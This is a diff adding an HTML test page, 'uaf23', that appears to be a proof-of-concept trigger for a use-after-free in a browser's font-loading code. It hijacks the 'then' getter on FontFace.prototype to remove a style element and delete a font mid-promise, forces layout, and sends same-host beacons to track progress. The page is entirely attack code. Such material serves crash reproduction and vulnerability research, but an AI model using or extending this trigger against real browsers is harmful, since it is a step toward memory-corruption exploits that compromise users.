@@ -1,0 +1,34 @@
+<!doctype html><meta charset="utf-8"><title>uaf23</title><body><script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+var styleEl=null, firedHere=false;
+function setup(){
+  var A=new FontFace('t0','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A); void A.loaded; window.__alive=[A];
+  styleEl=document.createElement('style');
+  styleEl.textContent="@font-face { font-family: u0; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  b('U23-SETUP');
+  firedHere=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if (firedHere) return undefined;
+      firedHere=true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+      /* deliberately NO allocation and NO check(): plain UAF continuation */
+      b('U23-GETTER-END-NOALLOC');
+      return undefined;
+    },
+    set:function(){}
+  });
+  b('U23-LOAD-CALLED');
+  document.fonts.load('1em t0, u0','AB').then(function(){ b('U23-RESOLVED'); },
+                                            function(){ b('U23-REJECTED'); });
+  setTimeout(function(){ b('U23-T400-ALIVE'); },400);
+}
+function run(){ b('U23-PARSE'); setup(); }
+if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script></body>
